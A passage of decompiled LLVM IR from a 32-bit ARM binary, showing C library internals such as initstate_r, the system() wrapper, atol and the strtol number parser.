  uselistorder i32 %v3_1633c, { 1, 0, 2 }
  uselistorder i32 %v3_1630c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 3, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_163c0, { 1, 0 }
  uselistorder label %dec_label_pc_163ac, { 1, 0 }
  uselistorder label %dec_label_pc_16350, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_163c8:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_163c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_163c8, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_163c8
  %v2_163c8 = load i32, i32* @r7, align 4
  %v5_163c8 = udiv i32 %v2_163c8, 8
  %v6_163c8 = and i32 %v5_163c8, %arg1
  store i32 %v6_163c8, i32* %r4.global-to-local, align 4
  %v2_163cc = load i32, i32* @sp, align 4
  %v8_163cc = shl i32 %v2_163cc, %arg3
  %v9_163cc = and i32 %v8_163cc, %arg2
  call void @__pseudo_branch(i32 %v9_163cc)
  %v0_163d0.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_163d0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_163d0.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_163d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_163d0 = load i32, i32* @fp, align 4
  %v8_163d0 = shl i32 %v2_163d0, %v3_163d0
  %v9_163d0 = and i32 %v8_163d0, %v1_163d0
  store i32 %v9_163d0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_163c8, %bb
  %v10_163d0 = phi i32 [ %arg1, %dec_label_pc_163c8 ], [ %v9_163d0, %bb ], [ %v1_163d0, %.thread ]
  ret i32 %v10_163d0

; uselistorder directives
  uselistorder i32 %v1_163d0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_163d8 = load i32, i32* @r4, align 4
  store i32 %v3_163d8, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_163f8, label %dec_label_pc_163e8

dec_label_pc_163e8:                               ; preds = %entry
  %v2_163e8 = icmp ugt i32 %arg2, 254
  %v7_163e8 = icmp eq i32 %arg2, 255
  %v2_163ec = xor i1 %v7_163e8, true
  %v3_163ec = and i1 %v2_163e8, %v2_163ec
  br i1 %v3_163ec, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_163e8
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_163e8, %bb
  %v1_164207 = phi i32 [ %v3_163d8, %dec_label_pc_163e8 ], [ 4, %bb ]
  %v2_163f0 = xor i1 %v2_163e8, true
  %v3_163f0 = or i1 %v7_163e8, %v2_163f0
  br i1 %v3_163f0, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_163f8:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_16410, label %dec_label_pc_16400

dec_label_pc_16400:                               ; preds = %dec_label_pc_163f8
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_1647c

.thread10:                                        ; preds = %dec_label_pc_16400
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_16410:                               ; preds = %dec_label_pc_163f8
  %v2_16410 = icmp ugt i32 %arg2, 62
  %v7_16410 = icmp eq i32 %arg2, 63
  %v2_16414 = xor i1 %v7_16410, true
  %v3_16414 = and i1 %v2_16410, %v2_16414
  br i1 %v3_16414, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_16410
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_16410, %bb22
  %v1_164206 = phi i32 [ %v3_163d8, %dec_label_pc_16410 ], [ 2, %bb22 ]
  %v2_16418 = xor i1 %v2_16410, true
  %v3_16418 = or i1 %v7_16410, %v2_16418
  br i1 %v3_16418, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_16428 = phi i32 [ 3, %bb21 ], [ %v1_164207, %bb20 ], [ %v1_164206, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1d86c.1021 to i32), i32* %r2.global-to-local, align 4
  %v4_16420 = mul i32 %v1_16428, 4
  %v5_16420 = add i32 %v4_16420, ptrtoint (i32* @global_var_1d86c.1021 to i32)
  store i32 %v5_16420, i32* %r3.global-to-local, align 4
  %v1_16424 = add i32 %v4_16420, add (i32 ptrtoint (i32* @global_var_1d86c.1021 to i32), i32 20)
  %v2_16424 = inttoptr i32 %v1_16424 to i32*
  %v3_16424 = load i32, i32* %v2_16424, align 4
  store i32 %v3_16424, i32* %r1.global-to-local, align 4
  %v6_16428 = inttoptr i32 %v5_16420 to i32*
  %v7_16428 = load i32, i32* %v6_16428, align 4
  store i32 %v7_16428, i32* %r2.global-to-local, align 4
  %v1_1642c = add i32 %tmp, 4
  store i32 %v1_1642c, i32* @r6, align 4
  %v4_16430 = mul i32 %v3_16424, 4
  %v5_16430 = add i32 %v4_16430, %v1_1642c
  store i32 %v5_16430, i32* %r3.global-to-local, align 4
  %v2_16434 = add i32 %arg3, 24
  %v3_16434 = inttoptr i32 %v2_16434 to i32*
  store i32 %v5_16430, i32* %v3_16434, align 4
  %v0_16438 = load i32, i32* %r2.global-to-local, align 4
  %v1_16438 = load i32, i32* @r5, align 4
  %v2_16438 = add i32 %v1_16438, 20
  %v3_16438 = inttoptr i32 %v2_16438 to i32*
  store i32 %v0_16438, i32* %v3_16438, align 4
  %v0_1643c = load i32, i32* %r1.global-to-local, align 4
  %v1_1643c = load i32, i32* @r5, align 4
  %v2_1643c = add i32 %v1_1643c, 16
  %v3_1643c = inttoptr i32 %v2_1643c to i32*
  store i32 %v0_1643c, i32* %v3_1643c, align 4
  %v0_16440 = load i32, i32* @r4, align 4
  %v1_16440 = load i32, i32* @r5, align 4
  %v2_16440 = add i32 %v1_16440, 12
  %v3_16440 = inttoptr i32 %v2_16440 to i32*
  store i32 %v0_16440, i32* %v3_16440, align 4
  %v0_16444 = load i32, i32* @r6, align 4
  %v1_16444 = load i32, i32* @r5, align 4
  %v2_16444 = add i32 %v1_16444, 8
  %v3_16444 = inttoptr i32 %v2_16444 to i32*
  store i32 %v0_16444, i32* %v3_16444, align 4
  %v0_16448 = load i32, i32* @r5, align 4
  store i32 %v0_16448, i32* %r1.global-to-local, align 4
  %v0_1644c = load i32, i32* @r0, align 4
  %v2_1644c = inttoptr i32 %v0_1644c to i32*
  %v3_1644c = call i32 @srandom_r(i32* %v2_1644c, i32 %v0_16448)
  store i32 %v3_1644c, i32* %r0.global-to-local, align 4
  %v0_16450 = load i32, i32* @r4, align 4
  %v2_16450 = icmp eq i32 %v0_16450, 0
  br i1 %v2_16450, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1646c12 = load i32, i32* @r7, align 4
  %v2_1646c13 = inttoptr i32 %v1_1646c12 to i32*
  store i32 0, i32* %v2_1646c13, align 4
  %v1_16470 = load i32, i32* @r4, align 4
  store i32 %v1_16470, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_16454 = load i32, i32* @r5, align 4
  %v2_16454 = add i32 %v1_16454, 4
  %v3_16454 = inttoptr i32 %v2_16454 to i32*
  %v4_16454 = load i32, i32* %v3_16454, align 4
  %v1_16458 = load i32, i32* @r6, align 4
  %v3_16458 = sub i32 %v4_16454, %v1_16458
  %v4_1645c = sdiv i32 %v3_16458, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_16464 = mul i32 %v4_1645c, 5
  %v5_16464 = add i32 %v4_16464, %v0_16450
  store i32 %v5_16464, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1646c = load i32, i32* @r7, align 4
  %v2_1646c = inttoptr i32 %v1_1646c to i32*
  store i32 0, i32* %v2_1646c, align 4
  %v1_16474 = load i32, i32* %r3.global-to-local, align 4
  %v2_16474 = load i32, i32* @r7, align 4
  %v3_16474 = inttoptr i32 %v2_16474 to i32*
  store i32 %v1_16474, i32* %v3_16474, align 4
  %v17_16478.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_16478 = phi i32 [ %v1_16470, %bb26 ], [ %v17_16478.pre, %.thread4 ]
  %v2_16478 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16478, i32* %r4.global-to-local, align 4
  ret i32 %v17_16478

dec_label_pc_1647c:                               ; preds = %dec_label_pc_16400
  %v0_1647c = call i32 @__errno_location()
  store i32 %v0_1647c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_16484 = inttoptr i32 %v0_1647c to i32*
  store i32 22, i32* %v2_16484, align 4
  %v0_16488 = call i32 @__errno_location()
  %v0_1648c = load i32, i32* %r4.global-to-local, align 4
  %v2_1648c = inttoptr i32 %v0_16488 to i32*
  store i32 %v0_1648c, i32* %v2_1648c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16494 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16494, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_16410, { 1, 0 }
  uselistorder i1 %v7_163e8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1d86c.1021 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d86c.1021 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1649c = load i32, i32* @r4, align 4
  %v0_164a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_164a0 = icmp eq i32 %v0_164a0, 0
  br i1 %v2_164a0, label %bb, label %dec_label_pc_164b4

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165c0

dec_label_pc_164b4:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_164bc = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_164cc = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_164dc = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_164dc, i32* %r0.global-to-local, align 4
  %v0_164e4 = call i32 @__vfork()
  store i32 %v0_164e4, i32* %r0.global-to-local, align 4
  store i32 %v0_164e4, i32* @r4, align 4
  %v1_164e8 = icmp slt i32 %v0_164e4, 0
  br i1 %v1_164e8, label %dec_label_pc_164f0, label %dec_label_pc_1651c

dec_label_pc_164f0:                               ; preds = %dec_label_pc_164b4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_164f8 = call i32 @__bsd_signal(i32 3, i32 %v2_164bc)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_16504 = call i32 @__bsd_signal(i32 2, i32 %v2_164cc)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_16510 = call i32 @__bsd_signal(i32 17, i32 %v2_164dc)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165c0

dec_label_pc_1651c:                               ; preds = %dec_label_pc_164b4
  %v2_164e8 = icmp eq i32 %v0_164e4, 0
  br i1 %v2_164e8, label %dec_label_pc_16520, label %dec_label_pc_16564

dec_label_pc_16520:                               ; preds = %dec_label_pc_1651c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_16528 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_1652c = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_16534 = call i32 @__bsd_signal(i32 2, i32 %v0_1652c)
  %v0_16538 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_16540 = call i32 @__bsd_signal(i32 17, i32 %v0_16538)
  store i32 ptrtoint ([8 x i8]* @global_var_1d894.1028 to i32), i32* @r0, align 4
  %v0_16554 = load i32, i32* @r4, align 4
  %v8_16558 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1d894.1028 to i32), i32 ptrtoint ([3 x i8]* @global_var_1d89c.1030 to i32), i32 ptrtoint ([3 x i8]* @global_var_1d8a0.1032 to i32), i32 %v0_164a0, i32 %v0_16554)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_16560 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_16564:                               ; preds = %dec_label_pc_1651c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1656c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_16578 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_16588 = load i32, i32* @r4, align 4
  store i32 %v0_16588, i32* %r0.global-to-local, align 4
  %v0_1658c = call i32 @wait4()
  store i32 %v0_1658c, i32* %r0.global-to-local, align 4
  %v7_16590 = icmp eq i32 %v0_1658c, -1
  br i1 %v7_16590, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_16564
  store i32 %v0_1658c, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_16564, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_165a0 = call i32 @__bsd_signal(i32 3, i32 %v2_164bc)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_165ac = call i32 @__bsd_signal(i32 2, i32 %v2_164cc)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_165b8 = call i32 @__bsd_signal(i32 17, i32 %v2_164dc)
  %v3_165bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_165bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165c0

dec_label_pc_165c0:                               ; preds = %bb, %dec_label_pc_164f0, %bb11
  %v8_165c4 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_164f0 ], [ %v3_165bc, %bb11 ]
  store i32 %v3_1649c, i32* @r4, align 4
  ret i32 %v8_165c4

; uselistorder directives
  uselistorder i32 %v0_1658c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_165c0, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_165dc = call i32 @strtol()
  ret i32 %v0_165dc
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_165e4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_165e4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_165e8 = load i32, i32* @r4, align 4
  store i32 %v3_165e8, i32* %stack_var_-36, align 4
  %v0_165ec = load i32, i32* @r1, align 4
  store i32 %v0_165ec, i32* %sb.global-to-local, align 4
  %v0_165f0 = load i32, i32* @r2, align 4
  store i32 %v0_165f0, i32* %r5.global-to-local, align 4
  %v0_165f4 = load i32, i32* @r3, align 4
  store i32 %v0_165f4, i32* %fp.global-to-local, align 4
  %v0_165f8 = load i32, i32* @r0, align 4
  %v2_1660c.pre = load i32, i32* @global_var_26250, align 4
  br label %dec_label_pc_16604

dec_label_pc_16604:                               ; preds = %dec_label_pc_16604, %entry
  %v0_1663c = phi i32 [ %v0_165f8, %entry ], [ %v1_16600, %dec_label_pc_16604 ]
  store i32 %v0_1663c, i32* %r4.global-to-local, align 4
  %v1_16608 = inttoptr i32 %v0_1663c to i8*
  %v2_16608 = load i8, i8* %v1_16608, align 1
  %v3_16608 = zext i8 %v2_16608 to i32
  store i32 %v3_16608, i32* @r2, align 4
  %v3_16610 = mul nuw nsw i32 %v3_16608, 2
  %v4_16610 = add i32 %v3_16610, %v2_1660c.pre
  %v5_16610 = inttoptr i32 %v4_16610 to i8*
  %v6_16610 = load i8, i8* %v5_16610, align 1
  %v1_16614 = and i8 %v6_16610, 32
  %v2_16614 = icmp eq i8 %v1_16614, 0
  %v1_16600 = add i32 %v0_1663c, 1
  br i1 %v2_16614, label %dec_label_pc_1661c, label %dec_label_pc_16604

dec_label_pc_1661c:                               ; preds = %dec_label_pc_16604
  %v7_1661c = icmp eq i8 %v2_16608, 43
  br i1 %v7_1661c, label %dec_label_pc_1663c, label %dec_label_pc_16624

dec_label_pc_16624:                               ; preds = %dec_label_pc_1661c
  %v7_16624 = icmp eq i8 %v2_16608, 45
  br i1 %v7_16624, label %dec_label_pc_1663c, label %bb

bb:                                               ; preds = %dec_label_pc_16624
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16640

dec_label_pc_1663c:                               ; preds = %dec_label_pc_1661c, %dec_label_pc_16624
  %storemerge43 = phi i32 [ 1, %dec_label_pc_16624 ], [ 0, %dec_label_pc_1661c ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_16600, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16640

dec_label_pc_16640:                               ; preds = %bb, %dec_label_pc_1663c
  %v0_16660 = phi i32 [ %v0_1663c, %bb ], [ %v1_16600, %dec_label_pc_1663c ]
  %v1_16640 = and i32 %v0_165f0, -17
  %v3_16640 = icmp eq i32 %v1_16640, 0
  br i1 %v3_16640, label %dec_label_pc_1664c, label %bb54

bb54:                                             ; preds = %dec_label_pc_16640
  br label %bb58

dec_label_pc_1664c:                               ; preds = %dec_label_pc_16640
  %v1_1664c = inttoptr i32 %v0_16660 to i8*
  %v2_1664c = load i8, i8* %v1_1664c, align 1
  %v7_16650 = icmp eq i8 %v2_1664c, 48
  %v1_16654 = add i32 %v0_165f0, 10
  store i32 %v1_16654, i32* %r5.global-to-local, align 4
  br i1 %v7_16650, label %dec_label_pc_16660, label %bb55

bb55:                                             ; preds = %dec_label_pc_1664c
  br label %.thread8

dec_label_pc_16660:                               ; preds = %dec_label_pc_1664c
  %v1_16660 = add i32 %v0_16660, 1
  %v2_16660 = inttoptr i32 %v1_16660 to i8*
  %v3_16660 = load i8, i8* %v2_16660, align 1
  %v4_16660 = zext i8 %v3_16660 to i32
  store i32 %v1_16660, i32* %r4.global-to-local, align 4
  %v1_16664 = or i32 %v4_16660, 32
  %v7_16668 = icmp eq i32 %v1_16664, 120
  %v1_1666c = add i32 %v0_165f0, 8
  store i32 %v1_1666c, i32* %r5.global-to-local, align 4
  br i1 %v7_16668, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_16660
  %v3_16678 = mul i32 %v1_1666c, 2
  store i32 %v3_16678, i32* %r5.global-to-local, align 4
  %v2_1667c = add i32 %v0_16660, 2
  store i32 %v2_1667c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_16660, %bb55, %bb56
  %v1_1674028 = phi i32 [ %v0_165f8, %bb55 ], [ %v1_16660, %bb56 ], [ %v1_16660, %dec_label_pc_16660 ]
  %v0_166c819 = phi i32 [ %v0_16660, %bb55 ], [ %v2_1667c, %bb56 ], [ %v1_16660, %dec_label_pc_16660 ]
  %v0_16680 = phi i32 [ %v1_16654, %bb55 ], [ %v3_16678, %bb56 ], [ %v1_1666c, %dec_label_pc_16660 ]
  %v5_16684 = icmp slt i32 %v0_16680, 16
  br i1 %v5_16684, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_1674027 = phi i32 [ %v0_165f8, %bb54 ], [ %v1_1674028, %.thread8 ], [ %v1_1674028, %bb57 ]
  %v0_166c818 = phi i32 [ %v0_16660, %bb54 ], [ %v0_166c819, %.thread8 ], [ %v0_166c819, %bb57 ]
  %v0_16698 = phi i32 [ %v0_165f0, %bb54 ], [ %v0_16680, %.thread8 ], [ 16, %bb57 ]
  %v1_16688 = add i32 %v0_16698, -2
  %tmp = icmp ugt i32 %v1_16688, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_16698

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1673c

dec_label_pc_16698:                               ; preds = %bb58
  %v2_166a0 = urem i32 -1, %v0_16698
  %v1_166b0 = urem i32 %v2_166a0, 256
  store i32 %v1_166b0, i32* %sl.global-to-local, align 4
  %v2_166b4 = udiv i32 -1, %v0_16698
  store i32 0, i32* @ip, align 4
  store i32 %v2_166b4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_166c8

dec_label_pc_166c4:                               ; preds = %bb65, %dec_label_pc_16724
  %v0_166c4 = phi i32 [ %v1_166f4, %bb65 ], [ %v0_166c4.pre, %dec_label_pc_16724 ]
  br label %dec_label_pc_166c8

dec_label_pc_166c8:                               ; preds = %dec_label_pc_16698, %dec_label_pc_166c4
  %v1_1674025 = phi i32 [ %v1_1674027, %dec_label_pc_16698 ], [ %v0_166c4, %dec_label_pc_166c4 ]
  %v0_166f4 = phi i32 [ %v0_166c818, %dec_label_pc_16698 ], [ %v0_166c4, %dec_label_pc_166c4 ]
  %v1_166c8 = inttoptr i32 %v0_166f4 to i8*
  %v2_166c8 = load i8, i8* %v1_166c8, align 1
  %v3_166c8 = zext i8 %v2_166c8 to i32
  %v1_166cc = add nsw i32 %v3_166c8, -48
  %v1_166d0 = urem i32 %v1_166cc, 256
  %v1_166d8 = or i32 %v3_166c8, 32
  store i32 %v1_166d8, i32* @r2, align 4
  %tmp73 = icmp ult i32 %v1_166d0, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_166e0

dec_label_pc_166e0:                               ; preds = %dec_label_pc_166c8
  %v1_166e4 = add nsw i32 %v1_166d8, -87
  store i32 %v1_166e4, i32* @r2, align 4
  %tmp74 = icmp ugt i32 %v1_166d8, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_166e0
  %v5_166ec = urem i32 %v1_166e4, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_166c8, %dec_label_pc_166e0, %bb59
  %v3_1671c = phi i32 [ %v1_166d0, %dec_label_pc_166c8 ], [ 40, %dec_label_pc_166e0 ], [ %v5_166ec, %bb59 ]
  %v1_166f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_166f4 = add i32 %v0_166f4, 1
  store i32 %v1_166f4, i32* %r4.global-to-local, align 4
  %v6_166f8 = icmp slt i32 %v3_1671c, %v1_166f0
  br i1 %v6_166f8, label %dec_label_pc_166fc, label %dec_label_pc_1673c.loopexit

dec_label_pc_166fc:                               ; preds = %bb60
  %v0_166fc = load i32, i32* @ip, align 4
  %v1_166fc = load i32, i32* %r8.global-to-local, align 4
  %v9_166fc = icmp eq i32 %v0_166fc, %v1_166fc
  br i1 %v9_166fc, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_166fc
  br label %dec_label_pc_1670c

bb61:                                             ; preds = %dec_label_pc_166fc
  %v3_166fc = icmp ult i32 %v0_166fc, %v1_166fc
  br i1 %v3_166fc, label %dec_label_pc_1670c, label %dec_label_pc_16724

dec_label_pc_1670c:                               ; preds = %bb61, %.thread37
  %v4_167142240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_1670c = load i32, i32* %sl.global-to-local, align 4
  %v3_1670c = icmp uge i32 %v3_1671c, %v1_1670c
  %v9_1670c = icmp eq i32 %v3_1671c, %v1_1670c
  %v2_16710 = xor i1 %v3_1670c, true
  %v3_16710 = or i1 %v9_1670c, %v2_16710
  br i1 %v3_16710, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1670c
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_1670c, %bb62
  %v4_16714 = phi i32 [ %v4_167142240, %dec_label_pc_1670c ], [ 0, %bb62 ]
  %v2_16714 = xor i1 %v9_1670c, true
  %v3_16714 = and i1 %v3_1670c, %v2_16714
  br i1 %v3_16714, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_16714 = urem i32 %v4_16714, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_16718 = phi i32 [ %v5_16714, %bb64 ], [ %v4_16714, %bb63 ]
  %v2_16718 = icmp eq i32 %v0_16718, 0
  br i1 %v2_16718, label %bb65, label %dec_label_pc_16724

bb65:                                             ; preds = %thread-pre-split
  %v4_1671c = mul i32 %v0_166fc, %v1_166f0
  %v5_1671c = add i32 %v4_1671c, %v3_1671c
  store i32 %v5_1671c, i32* @ip, align 4
  br label %dec_label_pc_166c4

dec_label_pc_16724:                               ; preds = %bb61, %thread-pre-split
  %v0_16724 = call i32 @__errno_location()
  %v0_16728 = load i32, i32* %r7.global-to-local, align 4
  %v1_16728 = load i32, i32* %fp.global-to-local, align 4
  %v2_16728 = and i32 %v1_16728, %v0_16728
  store i32 %v2_16728, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_16734 = inttoptr i32 %v0_16724 to i32*
  store i32 34, i32* %v2_16734, align 4
  %v0_166c4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_166c4

dec_label_pc_1673c.loopexit:                      ; preds = %bb60
  %v0_1673c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %.thread, %dec_label_pc_1673c.loopexit
  %v1_16740 = phi i32 [ %v1_1674025, %dec_label_pc_1673c.loopexit ], [ %v1_1674027, %.thread ]
  %v2_16740 = phi i32 [ %v0_1673c.pre, %dec_label_pc_1673c.loopexit ], [ %v0_165ec, %.thread ]
  %v2_1673c = icmp eq i32 %v2_16740, 0
  br i1 %v2_1673c, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_1673c
  %v3_16740 = inttoptr i32 %v2_16740 to i32*
  store i32 %v1_16740, i32* %v3_16740, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_1673c, %bb66
  %v0_16744 = load i32, i32* %r7.global-to-local, align 4
  %v2_16744 = icmp eq i32 %v0_16744, 0
  %. = select i1 %v2_16744, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_16750 = load i32, i32* %fp.global-to-local, align 4
  %v2_16750 = icmp eq i32 %v0_16750, 0
  %v0_16774.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_16750, label %dec_label_pc_1676c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_16774.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_1675c, label %dec_label_pc_1676c

dec_label_pc_1675c:                               ; preds = %bb70
  %v0_1675c = call i32 @__errno_location()
  %v2_16764 = inttoptr i32 %v0_1675c to i32*
  store i32 34, i32* %v2_16764, align 4
  %v0_16768 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16768, i32* @ip, align 4
